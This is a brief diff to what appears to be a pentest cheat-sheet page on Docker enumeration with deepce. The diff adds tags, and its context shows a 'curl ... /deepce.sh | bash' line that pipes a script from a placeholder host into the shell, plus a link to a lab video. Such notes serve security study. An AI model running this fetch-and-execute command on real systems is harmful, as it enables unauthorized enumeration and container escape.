@@ -27,3 +27,7 @@ $ curl http://[HOST_IP]:[SERVER_PORT]/deepce.sh | bash
 ### Practical Example
 
 Ippsec's [Laboratory Video](https://youtu.be/ozmHeApuSj8?t=1370)
+
+# Tags
+
+#cheat-sheet #enum #docker
